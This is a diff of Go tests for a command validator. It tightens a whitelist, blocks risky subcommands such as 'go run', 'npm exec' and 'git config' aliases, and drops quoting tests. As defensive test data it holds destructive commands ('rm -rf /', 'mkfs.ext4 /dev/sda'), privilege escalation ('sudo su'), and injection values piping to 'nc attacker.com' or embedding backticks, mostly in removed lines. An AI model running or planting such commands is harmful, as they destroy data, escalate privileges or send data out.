@@ -52,7 +52,7 @@ func TestCommandValidation(t *testing.T) {
 		},
 		{
 			name:      "embedded dangerous command pattern in arg",
-			command:   "cat",
+			command:   "echo",
 			args:      []string{"rm -rf /"},
 			shouldErr: true,
 			reason:    "embedded dangerous command pattern should be blocked",
@@ -144,77 +144,61 @@ func TestStrictCommandValidator(t *testing.T) {
 	}
 }
 
-// TestIsCommandSafe tests the quick command safety check
-func TestIsCommandSafe(t *testing.T) {
-	tests := []struct {
-		command string
-		safe    bool
-	}{
-		{"ls -la", true},
-		{"rm -rf /", false},
-		{"mkfs.ext4 /dev/sda", false},
-		{"sudo su", false},
-		{"echo hello", true},
-	}
+// TestBlockedSubcommands tests that whitelisted commands with dangerous
+// subcommands are blocked (e.g., "go run", "npm exec", "find -exec").
+func TestBlockedSubcommands(t *testing.T) {
+	v := NewCommand()
 
-	for _, tt := range tests {
-		result := IsCommandSafe(tt.command)
-		if result != tt.safe {
-			t.Errorf("IsCommandSafe(%q) = %v, want %v", tt.command, result, tt.safe)
-		}
-	}
-}
-
-// TestQuoteCommandArgs tests command argument quoting
-func TestQuoteCommandArgs(t *testing.T) {
 	tests := []struct {
-		name     string
-		args     []string
-		expected []string
+		name      string
+		command   string
+		args      []string
+		shouldErr bool
 	}{
-		{
-			name:     "safe args",
-			args:     []string{"file.txt", "output.txt"},
-			expected: []string{"file.txt", "output.txt"},
-		},
-		{
-			name:     "args with semicolon",
-			args:     []string{"file;rm -rf /"},
-			expected: []string{"'file;rm -rf /'"},
-		},
-		{
-			name:     "args with pipe",
-			args:     []string{"file|nc attacker.com"},
-			expected: []string{"'file|nc attacker.com'"},
-		},
-		{
-			name:     "empty arg",
-			args:     []string{"", "file.txt"},
-			expected: []string{"file.txt"},
-		},
-		{
-			name:     "args with ampersand",
-			args:     []string{"file&&evil"},
-			expected: []string{"'file&&evil'"},
-		},
-		{
-			name:     "args with backticks",
-			args:     []string{"file`whoami`"},
-			expected: []string{"'file`whoami`'"},
-		},
+		// go: allowed subcommands
+		{name: "go build allowed", command: "go", args: []string{"build", "./..."}, shouldErr: false},
+		{name: "go test allowed", command: "go", args: []string{"test", "-race", "./..."}, shouldErr: false},
+		{name: "go vet allowed", command: "go", args: []string{"vet", "./..."}, shouldErr: false},
+		{name: "go mod tidy allowed", command: "go", args: []string{"mod", "tidy"}, shouldErr: false},
+		{name: "go version allowed", command: "go", args: []string{"version"}, shouldErr: false},
+		// go: blocked subcommands
+		{name: "go run blocked", command: "go", args: []string{"run", "main.go"}, shouldErr: true},
+		{name: "go generate blocked", command: "go", args: []string{"generate", "./..."}, shouldErr: true},
+		{name: "go tool blocked", command: "go", args: []string{"tool", "compile"}, shouldErr: true},
+		// npm: blocked subcommands
+		{name: "npm run blocked", command: "npm", args: []string{"run", "build"}, shouldErr: true},
+		{name: "npm exec blocked", command: "npm", args: []string{"exec", "evilpkg"}, shouldErr: true},
+		{name: "npm start blocked", command: "npm", args: []string{"start"}, shouldErr: true},
+		// npm: allowed subcommands
+		{name: "npm list allowed", command: "npm", args: []string{"list"}, shouldErr: false},
+		{name: "npm audit allowed", command: "npm", args: []string{"audit"}, shouldErr: false},
+		// yarn: blocked subcommands
+		{name: "yarn run blocked", command: "yarn", args: []string{"run", "dev"}, shouldErr: true},
+		{name: "yarn exec blocked", command: "yarn", args: []string{"exec", "something"}, shouldErr: true},
+		// git: blocked subcommands
+		{name: "git status allowed", command: "git", args: []string{"status"}, shouldErr: false},
+		{name: "git log allowed", command: "git", args: []string{"log", "--oneline"}, shouldErr: false},
+		{name: "git diff allowed", command: "git", args: []string{"diff"}, shouldErr: false},
+		{name: "git filter-branch blocked", command: "git", args: []string{"filter-branch", "--tree-filter", "cmd"}, shouldErr: true},
+		{name: "git config blocked", command: "git", args: []string{"config", "alias.evil", "!evil"}, shouldErr: true},
+		{name: "git difftool blocked", command: "git", args: []string{"difftool"}, shouldErr: true},
+		{name: "git mergetool blocked", command: "git", args: []string{"mergetool"}, shouldErr: true},
+		// Removed commands: now blocked by whitelist
+		{name: "cat removed from whitelist", command: "cat", args: []string{"file.txt"}, shouldErr: true},
+		{name: "grep removed from whitelist", command: "grep", args: []string{"pattern", "file.txt"}, shouldErr: true},
+		{name: "find removed from whitelist", command: "find", args: []string{".", "-name", "*.go"}, shouldErr: true},
+		{name: "make removed from whitelist", command: "make", args: []string{"build"}, shouldErr: true},
+		{name: "mkdir removed from whitelist", command: "mkdir", args: []string{"newdir"}, shouldErr: true},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := QuoteCommandArgs(tt.args)
-			if len(result) != len(tt.expected) {
-				t.Errorf("expected %d args, got %d", len(tt.expected), len(result))
-				return
+			err := v.ValidateCommand(tt.command, tt.args)
+			if tt.shouldErr && err == nil {
+				t.Errorf("ValidateCommand(%q, %v) = nil, want error", tt.command, tt.args)
 			}
-			for i := range result {
-				if result[i] != tt.expected[i] {
-					t.Errorf("arg[%d] = %q, want %q", i, result[i], tt.expected[i])
-				}
+			if !tt.shouldErr && err != nil {
+				t.Errorf("ValidateCommand(%q, %v) = %v, want nil", tt.command, tt.args, err)
 			}
 		})
 	}
@@ -233,14 +217,14 @@ func TestCommandValidationEdgeCases(t *testing.T) {
 	}{
 		{
 			name:      "args with && operator but no dangerous pattern",
-			command:   "grep",
+			command:   "echo",
 			args:      []string{"pattern", "&&", "file.txt"},
 			shouldErr: false,
 			reason:    "&& in args is safe with exec.Command (treated as literal)",
 		},
 		{
 			name:      "args with || operator but no dangerous pattern",
-			command:   "grep",
+			command:   "echo",
 			args:      []string{"pattern", "||", "file.txt"},
 			shouldErr: false,
 			reason:    "|| in args is safe with exec.Command (treated as literal)",
@@ -254,8 +238,8 @@ func TestCommandValidationEdgeCases(t *testing.T) {
 		},
 		{
 			name:      "safe args only",
-			command:   "cat",
-			args:      []string{"file.txt"},
+			command:   "ls",
+			args:      []string{"-la"},
 			shouldErr: false,
 			reason:    "safe command with safe args should be allowed",
 		},
